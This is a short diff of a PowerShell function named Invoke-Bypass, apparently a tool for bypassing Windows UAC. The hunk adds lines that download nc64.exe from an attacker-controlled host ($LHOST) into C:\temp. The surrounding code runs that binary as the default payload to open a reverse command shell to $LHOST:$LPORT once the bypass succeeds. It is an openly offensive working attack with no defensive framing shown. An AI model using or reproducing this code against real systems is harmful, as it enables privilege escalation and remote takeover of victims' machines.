@@ -12,6 +12,8 @@ function Invoke-Bypass {
     )
 
     # Default program to run on successful UAC bypass
+    mkdir C:\temp
+    wget http://$LHOST/nc64.exe -o C:\temp\nc64.exe
     $program = "cmd /c C:\Temp\nc64.exe $LHOST $LPORT -e cmd"
     
     # Create registry structure
